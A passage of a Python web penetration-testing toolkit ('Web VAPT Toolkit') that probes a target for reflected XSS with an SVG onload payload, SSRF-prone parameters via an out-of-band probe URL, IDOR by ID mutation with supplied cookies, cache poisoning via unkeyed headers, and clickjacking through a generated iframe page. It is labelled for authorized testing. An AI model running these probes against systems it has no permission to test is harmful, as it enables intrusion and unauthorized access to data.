            rr = s.request(m, url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
            if rr.status_code not in (400, 401, 403, 404, 405):
                print(Fore.YELLOW + f"[?] {m} returned {rr.status_code} (check if functional)" + Style.RESET_ALL)
            else:
                print(Fore.BLUE + f"[-] {m} returned {rr.status_code}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.BLUE + f"[-] {m} probe failed ({e})" + Style.RESET_ALL)


def run_http_methods() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== HTTP Methods Check ===\n" + Style.RESET_ALL)
    url = input("Enter target URL (e.g. https://example.com/): ").strip()
    if url:
        http_run_check(url)


# ===========================================================================
# TOOL 9: Reflected XSS Quick Probe
# ===========================================================================
import html as _html_mod
XSS_BASE_PAYLOAD = "<svg/onload=alert(1)>"


def xss_reflection(body: str, marker: str) -> Tuple[bool, str]:
    if marker in body:
        return True, "RAW reflection"
    if _html_mod.escape(marker) in body:
        return True, "HTML-escaped reflection"
    if quote_plus(marker) in body:
        return True, "URL-encoded reflection"
    return False, ""


def xss_test_url(u: str, timeout: int = 12) -> None:
    p = urlparse(u)
    if not p.scheme or not p.netloc:
        print(Fore.YELLOW + f"[!] Invalid URL: {u}" + Style.RESET_ALL)
        return

    params = parse_qsl(p.query, keep_blank_values=True)
    if not params:
        print(Fore.BLUE + f"[-] No query parameters: {u}" + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + f"\n=== Testing: {u} ===" + Style.RESET_ALL)
    s = requests.Session()

    for k, _ in params:
        marker = f"{XSS_BASE_PAYLOAD}{shared_rand(6)}"
        mu = shared_rebuild_url(u, [(pk, (marker if pk == k else pv)) for pk, pv in params])

        try:
            r = s.get(mu, headers=shared_default_ua(), verify=False, timeout=timeout, allow_redirects=True)
        except Exception as e:
            print(Fore.YELLOW + f"  - {k}: request failed ({e})" + Style.RESET_ALL)
            continue

        body = r.text[:200000]
        ok, why = xss_reflection(body, marker)
        ct = r.headers.get("Content-Type", "").lower()

        if ok and "raw" in why.lower() and ("text/html" in ct or "<html" in body.lower()):
            print(Fore.RED + f"  - {k}: POTENTIAL XSS ({why}) -> {r.status_code}" + Style.RESET_ALL)
        elif ok:
            print(Fore.YELLOW + f"  - {k}: reflection detected ({why}) -> {r.status_code}" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"  - {k}: no reflection -> {r.status_code}" + Style.RESET_ALL)


def run_xss_reflected() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== Reflected XSS Quick Probe ===\n" + Style.RESET_ALL)
    urls = shared_collect_urls()
    if not urls:
        one = input("Enter a single URL to test: ").strip()
        if one:
            urls = [one]
    for u in urls:
        xss_test_url(u)


# ===========================================================================
# TOOL 10: SSRF Candidate Detector
# ===========================================================================
SSRF_CANDIDATE_KEYS = {
    "url", "uri", "link", "path", "dest", "destination", "next", "redirect",
    "redirect_url", "redirect_uri", "callback", "return", "continue", "to",
    "site", "domain", "host", "proxy", "image", "img", "avatar",
    "file", "download", "feed", "endpoint", "api", "webhook", "target", "forward", "out",
}

SSRF_ERROR_SIGS = [
    "connection refused", "econnrefused", "timed out", "etimedout",
    "no route to host", "enetunreach", "name or service not known",
    "temporary failure in name resolution", "getaddrinfo",
    "invalid url", "unsupported protocol", "only http",
    "blocked", "disallowed host", "forbidden host",
]


def ssrf_is_candidate(k: str) -> bool:
    kl = k.lower()
    return kl in SSRF_CANDIDATE_KEYS or kl.endswith(("_url", "_uri", "_host", "_domain", "_link"))


def ssrf_analyze(u: str) -> List[str]:
    p = urlparse(u)
    params = parse_qsl(p.query, keep_blank_values=True)
    return sorted({k for k, _ in params if ssrf_is_candidate(k)})


def ssrf_probe(u: str, keys: List[str], probe_url: str, timeout: int = 12) -> None:
    p = urlparse(u)
    params = parse_qsl(p.query, keep_blank_values=True)
    s = requests.Session()

    for k in keys:
        mu = shared_rebuild_url(u, [(pk, (probe_url if pk == k else pv)) for pk, pv in params])
        try:
            r = s.get(mu, headers=shared_default_ua(), verify=False, timeout=timeout, allow_redirects=True)
        except Exception as e:
            print(Fore.YELLOW + f"  - {k}: request failed ({e})" + Style.RESET_ALL)
            continue

        hay = (r.text[:5000] + str(r.headers)).lower()
        sig = next((s_ for s_ in SSRF_ERROR_SIGS if s_ in hay), None)
        if sig:
            print(Fore.YELLOW + f"  - {k}: error signal '{sig}' -> {r.status_code} (verify with OOB logs)" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"  - {k}: no obvious error signal -> {r.status_code}" + Style.RESET_ALL)


def run_ssrf_detector() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== SSRF Candidate Detector ===\n" + Style.RESET_ALL)
    urls = shared_collect_urls()
    if not urls:
        one = input("Enter a single URL to analyze: ").strip()
        if one:
            urls = [one]

    probe_url = input("\nOptional: Enter probe URL (e.g. Burp Collaborator). Blank to skip active probes: ").strip()

    for u in urls:
        keys = ssrf_analyze(u)
        if not keys:
            print(Fore.BLUE + f"\n[-] No obvious SSRF params: {u}" + Style.RESET_ALL)
            continue

        print(Fore.MAGENTA + f"\n=== {u} ===" + Style.RESET_ALL)
        print(Fore.CYAN + f"Candidate params: {', '.join(keys)}" + Style.RESET_ALL)
        print("Recommendations:")
        print("  - Confirm with OOB logs (Collaborator/DNS).")
        print("  - Try URL parser bypasses (@, #, redirects, encoding, IP formats).")

        if probe_url:
            print(Fore.CYAN + "\nActive probe (still not confirmation without OOB):" + Style.RESET_ALL)
            ssrf_probe(u, keys, probe_url)


# ===========================================================================
# TOOL 11: IDOR Heuristics
# ===========================================================================
IDOR_ID_KEYS = {
    "id", "user", "userid", "user_id", "account", "account_id", "profile",
    "order", "invoice", "doc", "document", "item", "record", "uid",
}


def idor_candidates(params: List[Tuple[str, str]]) -> List[str]:
    out = set()
    for k, v in params:
        if re.fullmatch(r"\d{1,18}", v or ""):
            kl = k.lower()
            if kl in IDOR_ID_KEYS or kl.endswith("_id") or kl.endswith("id"):
                out.add(k)
    return sorted(out)


def idor_summary(r) -> Tuple[int, int, str]:
    return r.status_code, len(r.content or b""), r.headers.get("Content-Type", "")


def idor_run_on_url(u: str, s: requests.Session, headers: Dict[str, str], timeout: int = 12) -> None:
    p = urlparse(u)
    if not p.scheme or not p.netloc:
        print(Fore.YELLOW + f"[!] Invalid URL: {u}" + Style.RESET_ALL)
        return

    params = parse_qsl(p.query, keep_blank_values=True)
    keys = idor_candidates(params)
    if not keys:
        print(Fore.BLUE + f"[-] No obvious numeric ID params: {u}" + Style.RESET_ALL)
        return

    print(Fore.MAGENTA + f"\n=== Testing: {u} ===" + Style.RESET_ALL)

    try:
        r0 = s.get(u, headers=headers, verify=False, timeout=timeout, allow_redirects=True)
    except Exception as e:
        print(Fore.YELLOW + f"[!] Baseline failed: {e}" + Style.RESET_ALL)
        return

    st0, ln0, ct0 = idor_summary(r0)
    print(Fore.CYAN + f"Baseline: {st0} | len={ln0} | {ct0}" + Style.RESET_ALL)

    for k in keys:
        v0 = next((v for kk, v in params if kk == k), None)
        if v0 is None:
            continue
        try:
            n = int(v0)
        except Exception:
            continue

        for d in (-1, +1):
            mu = shared_rebuild_url(u, [(pk, (str(n + d) if pk == k else pv)) for pk, pv in params])
            try:
                r1 = s.get(mu, headers=headers, verify=False, timeout=timeout, allow_redirects=True)
            except Exception as e:
                print(Fore.BLUE + f"  - {k}{d:+}: request failed ({e})" + Style.RESET_ALL)
                continue

            st1, ln1, _ = idor_summary(r1)
            if st0 == 200 and st1 == 200:
                diff = abs(ln1 - ln0)
                if diff > 50 and diff < max(4000, int(ln0 * 0.25)):
                    print(Fore.YELLOW + f"  - {k}{d:+}: POSSIBLE IDOR (200 OK, len {ln0}->{ln1})" + Style.RESET_ALL)
                else:
                    print(Fore.BLUE + f"  - {k}{d:+}: 200 OK (len {ln1})" + Style.RESET_ALL)
            elif st1 in (401, 403, 404, 405):
                print(Fore.GREEN + f"  - {k}{d:+}: blocked ({st1})" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"  - {k}{d:+}: status {st1} (len {ln1})" + Style.RESET_ALL)


def run_idor_heuristics() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== IDOR Heuristics (Numeric ID Mutation) ===\n" + Style.RESET_ALL)

    urls = shared_collect_urls()
    if not urls:
        one = input("Enter a single URL to test: ").strip()
        if one:
            urls = [one]

    auth = input("\nOptional: Authorization header value (e.g. 'Bearer xxx'). Blank if none: ").strip()
    cookie = input("Optional: Cookie header value (paste from Burp). Blank if none: ").strip()

    headers = shared_default_ua()
    if auth:
        headers["Authorization"] = auth
    if cookie:
        headers["Cookie"] = cookie

    s = requests.Session()
    for u in urls:
        idor_run_on_url(u, s, headers)


# ===========================================================================
# TOOL 12: Cache Poisoning Signal Checks
# ===========================================================================
CACHE_UNKEYED_HEADERS = [
    "X-Forwarded-Host", "X-Host", "X-Forwarded-Proto", "X-Forwarded-Scheme",
    "X-Forwarded-For", "X-Original-URL", "X-Rewrite-URL",
]
CACHE_HINT_HEADERS = [
    "Age", "X-Cache", "X-Cache-Hits", "CF-Cache-Status", "Via",
    "X-Served-By", "Cache-Control", "Surrogate-Control", "Vary",
]


def cache_hints(resp) -> Dict[str, Optional[str]]:
    return {h: resp.headers.get(h) for h in CACHE_HINT_HEADERS if resp.headers.get(h) is not None}


def cache_reflected(resp, marker: str) -> bool:
    if marker in str(resp.headers):
        return True
    try:
        return marker in resp.text[:200000]
    except Exception:
        return False


def cache_get(url: str, headers: Dict[str, str], timeout: int = 12):
    return requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=True)


def run_cache_signals() -> None:
    print(Fore.CYAN + Style.BRIGHT + "\n=== Cache Poisoning Signal Checks (Heuristic) ===\n" + Style.RESET_ALL)

    url = input("Enter a target URL (cacheable GET if possible): ").strip()
    if not url:
        return

    p = urlparse(url)
    if not p.scheme or not p.netloc:
        print(Fore.YELLOW + "[!] Invalid URL." + Style.RESET_ALL)
        return

    base_headers = shared_default_ua()

    print(Fore.MAGENTA + "\n--- Baseline ---" + Style.RESET_ALL)
    r0 = cache_get(url, base_headers)
    print(Fore.CYAN + f"Status: {r0.status_code} | len={len(r0.content or b'')}" + Style.RESET_ALL)
    hints = cache_hints(r0)
    print("Cache hints:", hints if hints else "(none)")

    marker = "vapt" + shared_rand()
    findings = []

    for hdr in CACHE_UNKEYED_HEADERS[:4]:
        hh = dict(base_headers)
        hh[hdr] = marker

        print(Fore.MAGENTA + f"\n--- Variant: {hdr}: {marker} ---" + Style.RESET_ALL)
        r1 = cache_get(url, hh)
        print(Fore.CYAN + f"Status: {r1.status_code} | len={len(r1.content or b'')}" + Style.RESET_ALL)
        hints1 = cache_hints(r1)
        print("Cache hints:", hints1 if hints1 else "(none)")

        if cache_reflected(r1, marker):
            findings.append(hdr)
            print(Fore.YELLOW + f"[?] Marker reflected with {hdr} (possible unkeyed input reflection)" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + "[-] No marker reflection." + Style.RESET_ALL)

    print(Fore.BLUE + Style.BRIGHT + "\n=== Summary ===" + Style.RESET_ALL)
    if not findings:
        print(Fore.GREEN + "No obvious cache-poisoning reflection signals detected." + Style.RESET_ALL)
    else:
        for hdr in findings:
            print(Fore.YELLOW + f"- {hdr}: marker reflected (verify caching + persistence in Burp)" + Style.RESET_ALL)


# ===========================================================================
# TOOL 13: Clickjacking PoC Generator
# ===========================================================================
def cj_T(s: str) -> str: return f"{Fore.CYAN}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def cj_G(s: str) -> str: return f"{Fore.GREEN}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def cj_Y(s: str) -> str: return f"{Fore.YELLOW}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def cj_R(s: str) -> str: return f"{Fore.RED}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def cj_M(s: str) -> str: return f"{Fore.WHITE}{Style.DIM}{s}{Style.RESET_ALL}"
def cj_hr(w: int = 72) -> str: return "-" * w


def cj_normalize_url(u: str) -> str:
    u = u.strip()
    if not u:
        raise ValueError("Empty URL")
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    p = urlparse(u)
    if not p.netloc:
        raise ValueError("Invalid URL (missing host)")
    return u


def cj_get_headers(url: str, timeout: int = 8):
    return requests.get(url, timeout=timeout, verify=False, allow_redirects=True, stream=True)


def cj_extract_frame_ancestors(csp: str) -> str:
    parts = [p.strip() for p in csp.split(";")]
    for p in parts:
        if p.lower().startswith("frame-ancestors"):
            return p
    return "frame-ancestors (not found)"


def cj_analyze_framing_headers(resp) -> List[str]:
    h = {k.lower(): v for k, v in resp.headers.items()}
    notes: List[str] = []

    xfo = h.get("x-frame-options", "")
    csp = h.get("content-security-policy", "")

    if xfo:
        notes.append(f"X-Frame-Options: {xfo}")
        xfo_l = xfo.lower()
        if "deny" in xfo_l:
            notes.append(cj_R("-> DENY indicates framing should be blocked."))
        elif "sameorigin" in xfo_l:
            notes.append(cj_Y("-> SAMEORIGIN: framing only from same origin."))
        elif "allow-from" in xfo_l:
            notes.append(cj_Y("-> ALLOW-FROM is obsolete/limited support."))
        else:
            notes.append(cj_Y("-> Unusual XFO value; verify in browser."))

    if csp:
        notes.append(f"Content-Security-Policy: {csp}")
        if "frame-ancestors" in csp.lower():
            fa = cj_extract_frame_ancestors(csp)
            notes.append(f"frame-ancestors directive: {fa}")
            if "'none'" in fa.lower():
                notes.append(cj_R("-> frame-ancestors 'none' means framing blocked."))
            elif "'self'" in fa.lower():
                notes.append(cj_Y("-> frame-ancestors 'self' means same-origin only."))
            else:
                notes.append(cj_Y("-> frame-ancestors allows specific origins."))
        else:
            notes.append(cj_Y("-> CSP present but no frame-ancestors directive."))

    if not xfo and not csp:
        notes.append(cj_G("No XFO/CSP detected -> framing likely allowed (verify)."))

    if "set-cookie" in h:
        notes.append(cj_M("Note: Set-Cookie present; iframe behavior may differ."))

    return notes


def cj_write_poc_html(target_url: str, out_path: str) -> None:
    html = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Clickjacking Framing Test</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {{ font-family: Arial, sans-serif; margin: 24px; line-height: 1.4; }}
    .box {{ border: 1px solid #ddd; border-radius: 10px; padding: 16px;
            background: #fafafa; max-width: 1100px; }}
    .hint {{ color: #555; margin-top: 6px; }}
    iframe {{ width: 100%; height: 780px; border: 2px solid #111;
              border-radius: 8px; background: white; }}
    code {{ background: #eee; padding: 2px 6px; border-radius: 6px; }}
  </style>
</head>
<body>
  <div class="box">
    <h2>Clickjacking / Framing Verification</h2>
    <div>Target URL: <code>{target_url}</code></div>
    <div class="hint">
      If the page loads inside the iframe, the site may be framable.
      If it shows blank or "refused to connect", framing is likely blocked
      by X-Frame-Options or CSP frame-ancestors.
    </div>
  </div>
  <p></p>
  <iframe src="{target_url}" loading="lazy"></iframe>
  <p class="hint">
    Tip: serve this file with <code>python -m http.server 8000</code>
    and open via <code>http://127.0.0.1:8000/{os.path.basename(out_path)}</code>.
  </p>
</body>
</html>
"""
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)


def run_clickjacking() -> None:
    print(cj_T(cj_hr()))
    print(cj_T("  Clickjacking PoC Generator + Header Check"))
    print(cj_M("  Generates an iframe test page and checks XFO/CSP frame-ancestors"))
    print(cj_T(cj_hr()))
    print(cj_M("Use only with authorization."))

    url_in = input(cj_T("\nEnter target URL (e.g., https://example.com): ")).strip()
    try:
        target_url = cj_normalize_url(url_in)
    except Exception as e:
        print(cj_R(f"[!] Invalid URL: {e}"))
        return

    print(cj_M("\nFetching target headers..."))
    try:
        resp = cj_get_headers(target_url)
        print(cj_G(f"[+] Fetched OK: {resp.status_code} -> {resp.url}"))
    except Exception as e:
        print(cj_R(f"[!] Request failed: {e}"))
        return

    print(cj_T("\nHeader analysis"))
    print(cj_T(cj_hr()))
    for n in cj_analyze_framing_headers(resp):
        print(f"- {n}")
    print(cj_T(cj_hr()))

    out_name = "clickjacking_poc.html"
    out_path = os.path.join(os.getcwd(), out_name)
    cj_write_poc_html(resp.url, out_path)
    print(cj_G(f"\n[+] PoC generated: {out_path}"))

    ans = input(cj_T("\nOpen PoC in your default browser now? (y/n): ")).strip().lower()
    if ans == "y":
        try:
            webbrowser.open(f"file:///{out_path.replace(os.sep, '/')}")
            print(cj_G("[+] Opened."))
        except Exception as e:
            print(cj_Y(f"[!] Could not auto-open: {e}"))

    ans2 = input(cj_T("\nStart a local server on port 8000? (y/n): ")).strip().lower()
    if ans2 == "y":
        print(cj_M("\nServing current folder at http://127.0.0.1:8000/"))
        print(cj_M(f"Open: http://127.0.0.1:8000/{out_name}"))
        print(cj_M("Press Ctrl+C to stop.\n"))
        try:
            with socketserver.TCPServer(("127.0.0.1", 8000), http.server.SimpleHTTPRequestHandler) as httpd:
                httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n" + cj_Y("[*] Server stopped."))
        except Exception as e:
            print(cj_R(f"[!] Failed to start server: {e}"))


# ===========================================================================
# Main menu / dispatcher
# ===========================================================================
TOOLS_REGISTRY: Dict[str, Tuple[str, Any]] = {
    "1":  ("Host Header Injection Tester",                   run_host_attacker),
    "2":  ("JWT Workflow (audit + forge, unified REPL)",     run_jwt_attacker),
    "3":  ("Insecure Headers Enumeration",                   run_headers_check),
    "4":  ("SSL / TLS Audit (Protocols, Cert, Ciphers)",     run_ssl_enum),
    "5":  ("Request Smuggling Exploitation",                 run_smuggling),
    "6":  ("CORS Misconfiguration Checks",                   run_cors),
    "7":  ("Open Redirect Tester",                           run_open_redirect),
    "8":  ("HTTP Methods / Dangerous Verbs Check",           run_http_methods),
    "9":  ("Reflected XSS Quick Probe (Heuristic)",          run_xss_reflected),
    "10": ("SSRF Candidate Detector",                        run_ssrf_detector),
    "11": ("IDOR Heuristics (Numeric ID Mutation)",          run_idor_heuristics),
    "12": ("Cache Poisoning Signal Checks (Heuristic)",      run_cache_signals),
    "13": ("Clickjacking PoC Generator + Header Check",      run_clickjacking),
}

ASCII_BANNER = r"""
,-----.                           ,--.               ,--.          ,--.   ,--.       ,--.        ,---.          ,--.  ,--.
|  |) /_ ,--.--. ,---. ,--,--,  ,-|  | ,---. ,--,--, |  |,---.     |  |   |  | ,---. |  |-.     '   .-' ,--.,--.`--',-'  '-. ,---.
|  .-.  \|  .--'| .-. :|      \' .-. || .-. ||      \`-'(  .-'     |  |.'.|  || .-. :| .-. '    `.  `-. |  ||  |,--.'-.  .-'| .-. :
|  '--' /|  |   \   --.|  ||  |\ `-' |' '-' '|  ||  |   .-'  `)    |   ,'.   |\   --.| `-' |    .-'    |'  ''  '|  |  |  |  \   --.
`------' `--'    `----'`--''--' `---'  `---' `--''--'   `----'     '--'   '--' `----' `---'     `-----'  `----' `--'  `--'   `----'
"""

BOX_WIDTH = 68


def print_menu() -> None:
    print("+" + "-" * BOX_WIDTH + "+")
    print("|   Which workflow do you want to run?                               |")
    print("+" + "-" * BOX_WIDTH + "+")
    for key in sorted(TOOLS_REGISTRY.keys(), key=lambda x: int(x)):
        desc, _ = TOOLS_REGISTRY[key]
        line = f"[{key}] {desc}"
        print(f"|  {line:<{BOX_WIDTH-4}}|")
    print(f"|  {'[0] Exit':<{BOX_WIDTH-4}}|")
    print("+" + "-" * BOX_WIDTH + "+")


def main() -> None:
    print(ASCII_BANNER)
    print(Fore.CYAN + Style.BRIGHT + "Web VAPT Toolkit (consolidated)" + Style.RESET_ALL)
    print(Fore.WHITE + Style.DIM + "Authorized testing only.\n" + Style.RESET_ALL)

    # Allow direct dispatch via CLI arg, e.g. `vapt_toolkit.py 4`
    if len(sys.argv) >= 2 and sys.argv[1] in TOOLS_REGISTRY:
        choice = sys.argv[1]
    else:
        print_menu()
        choice = input("\nEnter choice number: ").strip()

    if choice == "0":
        print("Bye.")
        return
    if choice not in TOOLS_REGISTRY:
        print(Fore.RED + "Invalid choice." + Style.RESET_ALL)
        sys.exit(1)

    desc, fn = TOOLS_REGISTRY[choice]
    print(Fore.GREEN + f"\n[+] Launching: {desc}\n" + Style.RESET_ALL)

    try:
        fn()
    except KeyboardInterrupt:
        print("\n[!] Cancelled by user.")
    except Exception as e:
        print(Fore.RED + f"\n[!] Tool crashed: {e}" + Style.RESET_ALL)


if __name__ == "__main__":
    main()
